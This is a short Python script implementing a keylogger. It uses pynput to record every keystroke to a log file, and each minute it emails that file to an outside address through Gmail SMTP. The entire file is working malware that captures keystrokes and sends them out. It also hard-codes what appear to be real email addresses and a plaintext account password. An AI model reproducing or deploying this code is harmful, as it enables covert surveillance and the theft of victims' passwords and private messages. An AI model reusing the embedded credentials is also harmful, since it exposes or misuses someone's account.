import logging
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

# Set up logging
log_file = 'keylog.txt'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define function to log keystrokes
def on_press(key):
    logging.info(str(key))

# Define function to send email
def send_email():
    fromaddr = 'eliasmateogamepass@gmail.com'
    toaddr = 'crufty01@gmail.com'
    password = '131613elias131613E..E..'

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Keylogger Report'

    with open(log_file, 'rb') as f:
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(f.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename=log_file)
        msg.attach(attachment)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# Start keylogger and send email every minute
with keyboard.Listener(on_press=on_press) as listener:
    while True:
        time.sleep(60)  # Pause for 60 seconds
        send_email()